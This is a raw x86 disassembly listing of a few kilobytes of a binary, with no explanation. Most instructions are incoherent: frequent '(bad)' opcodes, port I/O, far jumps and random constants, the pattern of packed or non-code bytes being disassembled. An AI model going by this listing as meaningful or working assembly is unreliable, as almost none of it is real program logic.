  404207:	mov    dl,0x1
  404209:	test   al,0x22
  40420b:	mov    ecx,0xfe89145
  404210:	xor    bl,BYTE PTR [edi+eiz*4]
  404213:	pusha  
  404214:	cmc    
  404215:	cdq    
  404216:	jmp    0xd77af6a5
  40421b:	mov    ch,0x52
  40421d:	fild   WORD PTR [esi-0x5d]
  404220:	add    BYTE PTR [edx],al
  404222:	inc    DWORD PTR [eax]
  404224:	dec    edx
  404225:	push   0xffffff85
  404227:	sub    al,0xb5
  404229:	fmul   DWORD PTR [ebp-0x364b3c3d]
  40422f:	push   es
  404230:	mov    ebx,edi
  404232:	push   ebx
  404233:	(bad)  
  404234:	outs   dx,BYTE PTR ds:[esi]
  404235:	dec    ebx
  404236:	push   esp
  404237:	ret    0x6c0f
  40423a:	pop    ebx
  40423b:	push   esi
  40423c:	adc    eax,0x64edfe37
  404241:	gs pop ebp
  404243:	or     eax,0x8c6b906
  404248:	(bad)  
  404249:	sub    BYTE PTR [edi],ah
  40424b:	inc    esp
  40424c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40424d:	add    ah,BYTE PTR [esi-0x3]
  404250:	xchg   DWORD PTR [edi],esp
  404252:	daa    
  404253:	int3   
  404254:	mov    ds,eax
  404256:	ficom  DWORD PTR [esi+0x7cbb3cac]
  40425c:	mov    WORD PTR [edi+esi*4-0x59],?
  404260:	mov    ch,0xb1
  404262:	pop    edi
  404263:	xchg   ebx,eax
  404264:	cli    
  404265:	dec    esi
  404266:	adc    al,0x99
  404268:	pusha  
  404269:	jg     0x4042a7
  40426b:	mov    ebx,0x158d697e
  404270:	adc    eax,0xac6fa4ec
  404275:	xor    edx,ecx
  404277:	lods   eax,DWORD PTR ds:[esi]
  404278:	adc    ah,BYTE PTR [ebp+0xe]
  40427b:	js     0x40425f
  40427d:	mov    ebx,DWORD PTR [eiz*2-0xc07268b]
  404284:	call   0xf7ec:0x28ddc2d5
  40428b:	mov    cl,0xa
  40428d:	ss mov esp,0x6ab76d1c
  404293:	mov    eax,ds:0xb8dea173
  404298:	inc    eax
  404299:	test   BYTE PTR [edx],al
  40429b:	stos   BYTE PTR es:[edi],al
  40429c:	hlt    
  40429d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40429e:	add    al,0x46
  4042a0:	int    0x35
  4042a2:	stos   DWORD PTR es:[edi],eax
  4042a3:	mov    dl,0x2b
  4042a5:	jb     0x4042ea
  4042a7:	out    dx,eax
  4042a8:	inc    edi
  4042a9:	in     al,0x36
  4042ab:	out    0xfb,al
  4042ad:	leave  
  4042ae:	aas    
  4042af:	shl    BYTE PTR [edi],cl
  4042b1:	(bad)  
  4042b2:	arpl   WORD PTR [ebp+0x4b],dx
  4042b5:	sub    edx,eax
  4042b7:	outs   dx,BYTE PTR ds:[esi]
  4042b8:	mov    al,ds:0x5da7a83d
  4042bd:	cmp    DWORD PTR [edi+0xa515ed],ecx
  4042c3:	mov    cl,0xa5
  4042c5:	mov    ecx,0x78c61639
  4042ca:	adc    bl,BYTE PTR [ecx]
  4042cc:	(bad)
  4042cf:	xchg   edx,eax
  4042d0:	sbb    eax,0x1f4ce26c
  4042d5:	add    al,0x7a
  4042d7:	mov    BYTE PTR [ebp+0x62],0x17
  4042db:	sbb    BYTE PTR [eax+0x76],ah
  4042de:	push   eax
  4042df:	dec    ecx
  4042e0:	ja     0x404276
  4042e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042e3:	jecxz  0x40433d
  4042e5:	pop    eax
  4042e6:	cwde   
  4042e7:	out    0x8,eax
  4042e9:	inc    esp
  4042ea:	(bad)  
  4042eb:	jmp    FWORD PTR [edx+0x5cf84f56]
  4042f1:	enter  0x8f0d,0xd0
  4042f5:	fwait
  4042f6:	xchg   esi,eax
  4042f7:	arpl   ax,si
  4042f9:	pop    esp
  4042fa:	cs jns 0x4042bc
  4042fd:	xchg   ebp,eax
  4042fe:	jmp    0x973e:0xc3ef30d
  404305:	mov    cl,0xd5
  404307:	cmp    al,0x93
  404309:	loop   0x4042bd
  40430b:	call   0xa301:0xbaa2f480
  404312:	mov    al,ds:0x48467319
  404317:	xchg   ebp,eax
  404318:	and    eax,0x400ad0e9
  40431d:	mov    ds:0x42f87fa5,al
  404322:	adc    esp,DWORD PTR [ebx-0x5a]
  404325:	fs sub al,0xa8
  404328:	in     al,0x9c
  40432a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40432b:	xchg   edx,eax
  40432c:	sub    eax,DWORD PTR [ebx+0x62]
  40432f:	aas    
  404330:	rcl    ecx,0x19
  404333:	vpminsw ymm6,ymm7,YMMWORD PTR [ecx+0x47]
  404338:	cmp    eax,0xecd59ca9
  40433d:	jmp    0x663435ad
  404342:	xchg   esi,eax
  404343:	es jge 0x4043bc
  404346:	(bad)  
  404347:	jmp    0x9a2c6b93
  40434c:	addr16 pusha 
  40434e:	adc    bh,BYTE PTR [edx]
  404350:	dec    ebx
  404351:	adc    bh,BYTE PTR [esi]
  404353:	es sahf 
  404355:	xlat   BYTE PTR ds:[ebx]
  404356:	jno    0x4043ba
  404358:	sbb    ebx,DWORD PTR [ebp-0x13]
  40435b:	icebp  
  40435c:	in     eax,0xcc
  40435e:	and    eax,edi
  404360:	call   0x327c:0xa3a9f322
  404367:	mov    WORD PTR [eax+0x1a],es
  40436a:	add    DWORD PTR [edi+0x2d],0x3541926b
  404371:	sbb    BYTE PTR [ebp-0x1],ch
  404374:	icebp  
  404375:	sar    BYTE PTR [ebp-0x7f5acddd],1
  40437b:	sahf   
  40437c:	mov    ecx,0xdfed451c
  404381:	xchg   edi,eax
  404382:	mov    edi,0x25b1446c
  404387:	add    DWORD PTR [edi-0x6c],0xffffff8c
  40438b:	in     eax,0x97
  40438d:	nop
  40438e:	push   eax
  40438f:	and    ebp,DWORD PTR [eax+eiz*2-0x52]
  404393:	or     al,0x27
  404395:	dec    esp
  404396:	(bad)  
  404397:	ficomp DWORD PTR [edx]
  404399:	lods   eax,DWORD PTR ds:[esi]
  40439a:	ins    DWORD PTR es:[edi],dx
  40439b:	cmp    al,0x5e
  40439d:	sar    DWORD PTR [edx],1
  40439f:	fisubr DWORD PTR [ecx-0x71b371b7]
  4043a5:	rcr    DWORD PTR [eax+0x6a],1
  4043a8:	ficomp DWORD PTR [edi+ebx*8+0x112953e3]
  4043af:	ror    esi,cl
  4043b1:	aaa    
  4043b2:	lea    esi,[edx-0x523dde89]
  4043b8:	into   
  4043b9:	outs   dx,DWORD PTR ds:[esi]
  4043ba:	or     ch,BYTE PTR [bx+si]
  4043bd:	adc    esp,DWORD PTR [ebx-0x28]
  4043c0:	(bad)  
  4043c2:	shr    DWORD PTR [ebx],1
  4043c4:	mov    ds:0x8ada22d1,al
  4043c9:	aaa    
  4043ca:	xchg   BYTE PTR [esi+0x902de04],ch
  4043d0:	inc    edi
  4043d1:	fisttp WORD PTR [esi]
  4043d3:	stc    
  4043d4:	xchg   edi,eax
  4043d5:	adc    DWORD PTR [ebp+0x2eaceb7d],edi
  4043db:	std    
  4043dc:	sar    DWORD PTR [eax+eax*2+0x9],1
  4043e0:	pop    ebp
  4043e1:	aad    0xd8
  4043e3:	ror    BYTE PTR cs:[edi],0xb9
  4043e7:	push   ecx
  4043e8:	push   ss
  4043e9:	test   al,0xf2
  4043eb:	mov    cl,0x39
  4043ed:	xor    eax,0x3355c8eb
  4043f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043f3:	mov    ds:0x56477322,eax
  4043f8:	fadd   DWORD PTR [ecx]
  4043fa:	dec    esi
  4043fb:	add    eax,0x7ae79679
  404400:	test   al,0x1
  404402:	sub    BYTE PTR [ebx+0x5b],0xef
  404406:	out    dx,al
  404407:	jb     0x40445a
  404409:	cld    
  40440a:	and    esi,ebx
  40440c:	mov    cl,0x5b
  40440e:	xor    eax,0x220e073c
  404413:	sub    DWORD PTR [ebx],edi
  404415:	(bad)  
  404416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404417:	inc    esi
  404418:	cmp    dh,BYTE PTR ss:[ecx]
  40441b:	sbb    al,0xb3
  40441d:	jecxz  0x4043c4
  40441f:	js     0x404412
  404421:	jne    0x404468
  404423:	ja     0x404497
  404425:	pop    ebx
  404426:	cmp    eax,0xe36b4de
  40442b:	retf   0x11c4
  40442e:	and    bl,bh
  404430:	push   0x60
  404432:	push   ds
  404433:	dec    ebx
  404434:	icebp  
  404435:	mov    edx,0xf525570f
  40443a:	sti    
  40443b:	and    DWORD PTR [ebx+ecx*8],ebx
  40443e:	mov    bl,0x53
  404440:	pop    ds
  404441:	xor    DWORD PTR [ecx+0x3dc9c626],ebx
  404447:	leave  
  404448:	cmp    DWORD PTR [ecx],0xe31235d8
  40444e:	mov    ah,0x80
  404450:	mov    edi,0x7ee07fc9
  404455:	add    ebx,DWORD PTR [edx]
  404457:	fwait
  404458:	mov    esi,DWORD PTR [esi+0xe]
  40445b:	repnz adc bl,BYTE PTR [edx+eax*2+0x36]
  404460:	int    0x77
  404462:	adc    eax,0xac29d8b
  404467:	loopne 0x404406
  404469:	fiadd  WORD PTR [ebx+esi*4-0x4f655207]
  404470:	mov    WORD PTR [eax+0x18],fs
  404473:	xor    BYTE PTR [esi],bh
  404475:	pop    edi
  404476:	cmp    DWORD PTR [eax+ecx*2+0x26],ecx
  40447a:	les    ecx,FWORD PTR [ecx+0x33]
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x404436
  404490:	fisttp DWORD PTR [edi]
  404492:	mov    bh,0x5e
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404517
  40449c:	sub    dl,BYTE PTR [ecx]
  40449e:	cwde   
  40449f:	xchg   esi,eax
  4044a0:	adc    bh,BYTE PTR [ebx-0x35a35b2e]
  4044a6:	cmp    esi,DWORD PTR [ecx-0x5f148767]
  4044ac:	inc    ebp
  4044ad:	test   DWORD PTR [edx+eax*4-0x58284f60],ebp
  4044b4:	mov    cl,0x9c
  4044b6:	outs   dx,DWORD PTR ds:[esi]
  4044b7:	inc    esp
  4044b8:	pop    edi
  4044b9:	js     0x40448b
  4044bb:	and    bl,BYTE PTR [edx-0x28]
  4044be:	out    dx,eax
  4044bf:	pop    esi
  4044c0:	inc    ebx
  4044c1:	cld    
  4044c2:	push   0x4d
  4044c4:	or     al,0x53
  4044c6:	ins    BYTE PTR es:[edi],dx
  4044c7:	pop    ds
  4044c8:	jmp    0x40445e
  4044ca:	and    edi,esi
  4044cc:	pusha  
  4044cd:	mov    DWORD PTR [ecx],esp
  4044cf:	ret    
  4044d0:	dec    esi
  4044d1:	in     al,dx
  4044d2:	jo     0x404513
  4044d4:	cmp    al,0x2f
  4044d6:	iret   
  4044d7:	call   FWORD PTR ds:0xfa70f62f
  4044dd:	ret    0xc9c8
  4044e0:	inc    esi
  4044e1:	leave  
  4044e2:	(bad)  ds:0x2853c948
  4044e8:	arpl   WORD PTR [ebp+eiz*4+0x37],cx
  4044ec:	std    
  4044ed:	adc    al,0xf0
  4044ef:	cdq    
  4044f0:	add    BYTE PTR [eax+0x6dd97ec9],ch
  4044f6:	test   BYTE PTR [ebp+0x30],0xa
  4044fa:	dec    edx
  4044fb:	mov    esi,0x24972195
  404500:	int3   
  404501:	call   0x6202f41d
  404506:	fisttp WORD PTR [eax]
  404508:	ja     0x4044fc
  40450a:	stos   BYTE PTR es:[edi],al
  40450b:	ja     0x404578
  40450d:	jmp    0xc607:0x365e1d69
  404514:	push   edx
  404515:	outs   dx,DWORD PTR ds:[esi]
  404516:	sub    DWORD PTR [ecx+0x20757d1f],eax
  40451c:	add    esi,DWORD PTR [ebp+0x37dd0b6c]
  404522:	push   ss
  404523:	and    esi,DWORD PTR [edx-0x20]
  404526:	ins    BYTE PTR es:[edi],dx
  404527:	gs je  0x4044d6
  40452a:	test   al,0xe8
  40452c:	pop    ebp
  40452d:	fcomp  QWORD PTR [ecx-0x1cd30b8b]
  404533:	push   ecx
  404534:	enter  0x3148,0x92
  404538:	mov    ebp,0x5411c910
  40453e:	cmp    ecx,ecx
  404540:	and    ebp,ebp
  404542:	out    0xb0,eax
  404544:	mov    ch,0xcb
  404546:	data16 mov bh,0xb7
  404549:	mov    al,0x4b
  40454b:	ss clc 
  40454d:	clc    
  40454e:	rcl    eax,1
  404550:	dec    ecx
  404551:	daa    
  404552:	call   0x6ad4:0x35e182a3
  404559:	clc    
  40455a:	out    dx,eax
  40455b:	inc    edx
  40455c:	rcl    DWORD PTR [esi],cl
  40455e:	retf   0xf1d1
  404561:	rol    edi,0x26
  404564:	js     0x404584
  404566:	imul   edx,DWORD PTR [edi-0x589ab75e],0xffffffe9
  40456d:	pop    ebp
  40456e:	cmp    DWORD PTR [ecx],ebx
  404570:	(bad)
  404575:	gs cdq 
  404577:	push   ds
  404578:	outs   dx,DWORD PTR ds:[esi]
  404579:	add    eax,DWORD PTR [ebx]
  40457b:	add    DWORD PTR [edx],esp
  40457d:	sar    eax,1
  40457f:	in     al,dx
  404580:	jp     0x40455a
  404582:	inc    ecx
  404583:	pop    esp
  404584:	test   al,0xc5
  404586:	aam    0xca
  404588:	dec    esi
  404589:	lock test eax,0x83ef2c3c
  40458f:	mov    ch,0xfa
  404591:	inc    ebx
  404592:	stc    
  404593:	and    DWORD PTR [esi+0x39982903],ecx
  404599:	(bad)  
  40459a:	daa    
  40459b:	sub    BYTE PTR [eax-0x35e7460c],0x77
  4045a2:	adc    al,0x44
  4045a4:	inc    esi
  4045a5:	dec    eax
  4045a6:	aam    0x68
  4045a8:	sub    dl,BYTE PTR [esi-0x6442f982]
  4045ae:	sub    ebx,edi
  4045b0:	xor    esi,DWORD PTR [ecx-0x5aeb0ab2]
  4045b6:	cli    
  4045b7:	xlat   BYTE PTR ds:[ebx]
  4045b8:	bound  esi,QWORD PTR [ebx+0x40552459]
  4045be:	and    edx,ebp
  4045c0:	inc    ebp
  4045c1:	ss cmp eax,0xab75a16c
  4045c7:	jl     0x4045c2
  4045c9:	xor    al,0x7a
  4045cb:	mov    BYTE PTR [ecx],ch
  4045cd:	jg     0x40456a
  4045cf:	shr    BYTE PTR [esi+0x41ddf66d],cl
  4045d5:	sub    al,0x4d
  4045d7:	inc    esp
  4045d8:	push   esi
  4045d9:	(bad)  
  4045da:	mov    bl,0x1
  4045dc:	ss jbe 0x4045a7
  4045df:	add    BYTE PTR [eax],ah
  4045e1:	cmp    dl,BYTE PTR [eax]
  4045e3:	xor    BYTE PTR [ecx-0x42137321],cl
  4045e9:	nop
  4045ea:	popf   
  4045eb:	test   eax,0x255dabe
  4045f0:	ror    DWORD PTR [edx-0x6b66fabb],1
  4045f6:	mov    al,ds:0x535b4f9e
  4045fb:	add    BYTE PTR [edx+eiz*1],bh
  4045fe:	xchg   cl,ch
  404600:	push   esi
  404601:	call   0xe907fe06
  404606:	je     0x404607
  404608:	pop    ebp
  404609:	dec    eax
  40460a:	sti    
  40460b:	dec    edx
  40460c:	mov    esi,0x2d770960
  404611:	push   esp
  404612:	imul   BYTE PTR [ebp+0x3f]
  404615:	jae    0x4045e3
  404617:	inc    DWORD PTR [esi-0x5b]
  40461a:	add    BYTE PTR [esi-0x4a],bh
  40461d:	sar    DWORD PTR [ebp+0x1b4fc736],1
  404623:	xchg   ecx,eax
  404624:	outs   dx,BYTE PTR ds:[esi]
  404625:	inc    esp
  404626:	jno    0x404633
  404628:	pop    ds
  404629:	retf   0x4751
  40462c:	add    BYTE PTR [edx-0x73e83b86],bl
  404632:	jle    0x40462e
  404634:	push   ss
  404635:	cwde   
  404636:	or     al,0x63
  404638:	or     eax,0xb0f6a951
  40463d:	lds    esi,FWORD PTR [edx-0x3dd5d03d]
  404643:	imul   ebx,DWORD PTR [esi-0x43],0xffffffe2
  404647:	xchg   edi,eax
  404648:	jmp    0x4045f0
  40464a:	jle    0x40467b
  40464c:	xor    eax,0x75f7a781
  404651:	stos   DWORD PTR es:[edi],eax
  404652:	jmp    FWORD PTR [esp]
  404655:	sbb    esi,DWORD PTR [ebp+0x5695a13]
  40465b:	out    0xd9,al
  40465d:	out    0x57,eax
  40465f:	ins    BYTE PTR es:[edi],dx
  404660:	xor    bh,BYTE PTR [ebp-0x30ed6ab]
  404666:	sub    al,0xb5
  404668:	inc    edx
  404669:	jecxz  0x40463b
  40466b:	ficomp WORD PTR [ebx+0x0]
  40466e:	popf   
  40466f:	das    
  404670:	scas   eax,DWORD PTR es:[edi]
  404671:	push   ecx
  404672:	test   DWORD PTR [edx-0x25267832],edx
  404678:	out    dx,eax
  404679:	dec    ebx
  40467a:	or     ah,BYTE PTR [eax]
  40467c:	fs es jecxz 0x40463c
  404680:	jge    0x40463c
  404682:	sbb    al,BYTE PTR [edx-0x1f]
  404685:	push   ebp
  404686:	dec    esp
  404687:	ret    
  404688:	sbb    al,0x1c
  40468a:	mov    DWORD PTR [ebp-0x29],edi
  40468d:	sbb    ebx,DWORD PTR [ebp-0x1593f9b0]
  404693:	jg     0x4046cb
  404695:	mov    eax,0xf22a90f0
  40469a:	sbb    DWORD PTR [ebp+0x77],eax
  40469d:	jg     0x404697
  40469f:	xchg   BYTE PTR [edi],dl
  4046a1:	mov    bh,0xe7
  4046a3:	jmp    0x4ff603c3
  4046a8:	add    bl,BYTE PTR [ecx+ebx*4-0x211e9ccc]
  4046af:	jl     0x404640
  4046b1:	ret    
  4046b2:	repz pop ss
  4046b4:	pop    ecx
  4046b5:	inc    esi
  4046b6:	xor    eax,0xc921925d
  4046bb:	sbb    BYTE PTR [edx+0x3774f13e],ah
  4046c1:	jecxz  0x4046ed
  4046c3:	adc    ah,dh
  4046c5:	mov    ah,0x64
  4046c7:	mov    esp,0xa71aeba9
  4046cc:	pop    ebp
  4046cd:	ins    DWORD PTR es:[edi],dx
  4046ce:	mov    ebp,0x3eb6313f
  4046d3:	popf   
  4046d4:	xor    bl,BYTE PTR [edx+0x362e92b3]
  4046da:	ins    BYTE PTR es:[edi],dx
  4046db:	inc    eax
  4046dc:	mov    ah,0x35
  4046de:	(bad)  
  4046df:	and    al,0x77
  4046e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046e2:	xlat   BYTE PTR ds:[ebx]
  4046e3:	aam    0x28
  4046e5:	push   0x21
  4046e7:	test   DWORD PTR [edx+0x65],ebp
  4046ea:	push   0xdf65a65f
  4046ef:	pop    ecx
  4046f0:	jns    0x40467f
  4046f2:	rol    BYTE PTR [eax-0x18],0xfc
  4046f6:	mov    esi,0xebf21cc
  4046fb:	outs   dx,BYTE PTR ds:[esi]
  4046fc:	shr    BYTE PTR [eax+0x3e61db36],0x67
  404703:	mov    BYTE PTR [edx],bl
  404705:	mov    ah,0x66
  404707:	sbb    eax,0x95c6332f
  40470c:	xchg   esp,eax
  40470d:	imul   edi,DWORD PTR [esi-0x69],0xffffffc4
  404711:	mov    al,ds:0xb2099df8
  404716:	stos   DWORD PTR es:[edi],eax
  404717:	xchg   edx,eax
  404718:	xchg   esi,eax
  404719:	dec    esi
  40471a:	add    eax,0x2cfcb3a6
  40471f:	nop
  404720:	lea    esi,[eax+0x4a]
  404723:	call   0x6a8e:0x41d2d7b2
  40472a:	dec    edx
  40472b:	jge    0x404702
  40472d:	add    al,0x56
  40472f:	sub    DWORD PTR [edx+ebp*4+0x55d1888d],eax
  404736:	dec    eax
  404737:	inc    esi
  404738:	ins    BYTE PTR es:[edi],dx
  404739:	jecxz  0x4046d2
  40473b:	hlt    
  40473c:	js     0x40479a
  40473e:	in     al,dx
  40473f:	aas    
  404740:	test   DWORD PTR [esi+0x1f],ecx
  404743:	and    bh,ah
  404745:	(bad)  
  404746:	sahf   
  404747:	or     BYTE PTR [ecx],dh
  404749:	mov    ds:0xb84f9a4f,eax
  40474e:	loopne 0x4047ad
  404750:	repz pop eax
  404752:	mov    DWORD PTR [esi-0x143051ce],esp
  404758:	(bad)  
  40475a:	mov    al,ds:0x94223054
  40475f:	shl    ebx,cl
  404761:	repz mov ebx,0x49e37de8
  404768:	retf   0x30be
  40476b:	ins    DWORD PTR es:[edi],dx
  40476c:	push   cs
  40476d:	sub    ecx,esi
  40476f:	loopne 0x404738
  404771:	xor    BYTE PTR [edi+0x3ba43d1c],ch
  404777:	ds in  al,dx
  404779:	stos   BYTE PTR es:[edi],al
  40477a:	mov    al,0x73
  40477c:	iret   
  40477d:	pop    edx
  40477e:	jo     0x404762
  404780:	fdiv   DWORD PTR [ebx]
  404782:	rol    BYTE PTR [ebx],1
  404784:	stc    
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	jmp    0x404827
  4047b6:	repnz test eax,0x7e7e27b8
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x40478f
  4047c1:	mov    eax,ds:0x77c49178
  4047c6:	inc    esi
  4047c7:	adc    al,0xf0
  4047c9:	dec    ecx
  4047ca:	(bad)
  4047cf:	jo     0x40484c
  4047d1:	mov    al,0x6f
  4047d3:	push   eax
  4047d4:	cmp    ch,BYTE PTR [eax]
  4047d6:	(bad)  
  4047d7:	mov    ecx,0xb4726599
  4047dc:	ja     0x4047b5
  4047de:	cmp    DWORD PTR [esi+0x10927365],0x529a6af5
  4047e8:	int3   
  4047e9:	cmc    
  4047ea:	jno    0x404855
  4047ec:	dec    edx
  4047ed:	repnz push es
  4047ef:	jmp    0xef7e:0x816bf839
  4047f6:	mov    ds:0x116cc4d4,al
  4047fb:	mov    ds:0x2c899fd8,al
  404800:	push   ebx
  404801:	retf   0x922a
  404804:	lahf   
  404805:	xor    al,0x56
  404807:	clc    
  404808:	pop    es
  404809:	xchg   edx,eax
  40480a:	pop    ecx
  40480b:	sbb    bh,BYTE PTR [ecx]
  40480d:	mov    cl,ah
  40480f:	mov    dl,0x64
  404811:	enter  0xda41,0x14
  404815:	dec    edx
  404816:	pop    esi
  404817:	fucomp st(3)
  404819:	adc    edx,DWORD PTR [ebp+0x158c998]
  40481f:	fist   DWORD PTR [edi-0xb1b8c43]
  404825:	inc    ebp
  404826:	outs   dx,DWORD PTR ds:[esi]
  404827:	ror    dl,0x84
  40482a:	jns    0x404800
  40482c:	hlt    
  40482d:	or     ah,BYTE PTR [edx+0x65]
  404830:	or     edi,ecx
  404832:	fidivr DWORD PTR [ecx-0x75]
  404835:	mov    cl,0x18
  404837:	jl     0x404831
  404839:	pusha  
  40483a:	xchg   ecx,eax
  40483b:	add    eax,0x8c9ecf51
  404840:	jp     0x40483b
  404842:	jle    0x40486b
  404844:	shl    cl,1
  404846:	cs js  0x40484e
  404849:	pop    ss
  40484a:	dec    eax
  40484b:	ds sub al,0x98
  40484e:	hlt    
  40484f:	mov    dh,0x85
  404851:	mov    cl,0xba
  404853:	push   eax
  404854:	xor    cl,dl
  404856:	and    ecx,edi
  404858:	inc    ebp
  404859:	aad    0x98
  40485b:	add    BYTE PTR [edx-0x388cf8f1],bh
  404861:	int    0xb8
  404863:	enter  0x3d2,0xef
  404867:	jecxz  0x404854
  404869:	mov    eax,0x954fc336
  40486e:	ficomp DWORD PTR [ebp+0x42]
  404871:	jmp    0x404816
  404873:	xor    BYTE PTR [edx+0x6375a9ca],cl
  404879:	ins    DWORD PTR es:[edi],dx
  40487a:	inc    edx
  40487b:	fwait
  40487c:	sub    al,ch
  40487e:	sub    al,0x80
  404880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404881:	ins    BYTE PTR es:[edi],dx
  404882:	inc    ebx
  404883:	ret    0xef79
  404886:	fild   DWORD PTR [esi-0x48]
  404889:	cdq    
  40488a:	xor    DWORD PTR [ebx+0x5b],ebx
  40488d:	and    ch,bh
  40488f:	dec    ecx
  404890:	sub    DWORD PTR [edi-0x60],ebx
  404893:	lods   al,BYTE PTR cs:[si]
  404896:	jge    0x40485b
  404898:	cmp    DWORD PTR [eax+edx*1],0x732100a9
  40489f:	dec    ebp
  4048a0:	loop   0x4048ef
  4048a2:	in     al,0x5a
  4048a4:	push   esi
  4048a5:	test   al,0xe4
  4048a7:	ins    DWORD PTR es:[edi],dx
  4048a8:	test   al,ch
  4048aa:	fdiv   DWORD PTR [ebx+0x47b5e51]
  4048b0:	jb     0x4048c0
  4048b2:	pop    ds
  4048b3:	scas   eax,DWORD PTR es:[edi]
  4048b4:	test   al,0x5c
  4048b6:	mov    BYTE PTR [esp+ecx*1-0x42],dh
  4048ba:	in     al,dx
  4048bb:	sbb    BYTE PTR [ecx],ah
  4048bd:	inc    edx
  4048be:	xchg   cl,bl
  4048c0:	adc    eax,0xbaf4ae5e
  4048c5:	out    0x21,al
  4048c7:	stos   DWORD PTR es:[edi],eax
  4048c8:	js     0x40491e
  4048ca:	in     eax,0x94
  4048cc:	mov    ah,0x37
  4048ce:	mov    DWORD PTR ds:0x3828cf9d,ebp
  4048d4:	cmp    al,0xf1
  4048d6:	jle    0x4048ef
  4048d8:	pusha  
  4048d9:	pushf  
  4048da:	and    BYTE PTR [esi],bh
  4048dc:	mov    bl,0xe5
  4048de:	pop    ss
  4048df:	pop    es
  4048e0:	fsqrt  
  4048e2:	mov    esp,0x1345425c
  4048e7:	mov    al,ds:0xb69d70ac
  4048ec:	(bad)  [ebp+0x70b1220f]
  4048f2:	jle    0x4048e1
  4048f4:	lods   al,BYTE PTR ds:[esi]
  4048f5:	push   cs
  4048f6:	pop    ebp
  4048f7:	cmp    ecx,DWORD PTR [edx-0xf6ad479]
  4048fd:	jecxz  0x40491e
  4048ff:	pop    ebp
  404900:	xchg   ecx,eax
  404901:	les    esp,FWORD PTR [edx-0x3e9bc896]
  404907:	mov    DWORD PTR [ebp+0x21],edi
  40490a:	add    eax,0x12cf0d1c
  40490f:	(bad)  
  404911:	and    ebx,edx
  404913:	or     DWORD PTR [ebx],ebp
  404915:	js     0x4048aa
  404917:	ret    0x77c2
  40491a:	aas    
  40491b:	inc    ebx
  40491c:	push   ds
  40491d:	repnz add eax,0xca280942
  404923:	inc    ebp
  404924:	out    dx,eax
  404925:	mov    bh,ch
  404927:	int    0x91
  404929:	(bad)  
  40492a:	mov    ds:0xbfa0d842,eax
  40492f:	div    DWORD PTR [esp+edi*2-0x7d1a819c]
  404936:	xlat   BYTE PTR ds:[ebx]
  404937:	ret    
  404938:	or     bl,0x1c
  40493b:	data16 lods al,BYTE PTR ds:[esi]
  40493d:	inc    edi
  40493e:	sbb    BYTE PTR [ecx],dl
  404940:	aad    0x7c
  404942:	sahf   
  404943:	push   ds
  404944:	in     eax,0x3f
  404946:	retf   
  404947:	pop    esp
  404948:	jg     0x4048fe
  40494a:	rcr    BYTE PTR [ebx],1
  40494c:	fwait
  40494d:	cmp    eax,0x2ff58306
  404952:	mov    bh,0x42
  404954:	lahf   
  404955:	leave  
  404956:	xor    al,0x40
  404958:	ins    DWORD PTR es:[edi],dx
  404959:	repnz fcmovnb st,st(2)
  40495c:	test   BYTE PTR [edi-0x5e99a0e5],al
  404962:	xchg   ebp,eax
  404963:	popf   
  404964:	shl    DWORD PTR [ecx+0x37c8f040],1
  40496a:	jb     0x40492b
  40496c:	xor    edx,DWORD PTR [esi-0x49]
  40496f:	scas   eax,DWORD PTR es:[edi]
  404970:	adc    esp,DWORD PTR [esi-0x60]
  404973:	das    
  404974:	push   edi
  404975:	into   
  404976:	test   eax,0xf83eab6
  40497b:	push   edi
  40497c:	out    dx,al
  40497d:	repz xchg ebx,eax
  40497f:	jne    0x40497a
  404981:	mov    bl,0xb8
  404983:	mov    eax,DWORD PTR [ecx-0x76]
  404986:	sub    dh,BYTE PTR [edx]
  404988:	es test bl,dl
  40498b:	xchg   esi,eax
  40498c:	into   
  40498d:	hlt    
  40498e:	cli    
  40498f:	inc    esi
  404990:	mov    edi,0x264a1708
  404995:	out    dx,eax
  404996:	pop    eax
  404997:	imul   eax,edi,0x6f61030c
  40499d:	inc    edx
  40499e:	sbb    DWORD PTR [edi+eiz*1-0x6469bb33],edi
  4049a5:	push   esp
  4049a6:	mov    ebx,ebp
  4049a8:	or     al,0x9a
  4049aa:	pop    ds
  4049ab:	rol    ch,cl
  4049ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049ae:	(bad)  
  4049af:	jnp    0x404a20
  4049b1:	push   0xffffffb8
  4049b3:	popf   
  4049b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049b5:	sti    
  4049b6:	xchg   ebp,eax
  4049b7:	stos   BYTE PTR es:[edi],al
  4049b8:	sbb    DWORD PTR [esi+0x4ec6c752],ebp
  4049be:	popf   
  4049bf:	in     eax,dx
  4049c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049c1:	xchg   ecx,eax
  4049c2:	dec    eax
  4049c3:	popf   
  4049c4:	xor    ebx,DWORD PTR [ebp-0x71]
  4049c7:	in     al,dx
  4049c8:	xor    al,0x87
  4049ca:	jnp    0x4049ad
  4049cc:	jmp    0x71923acb
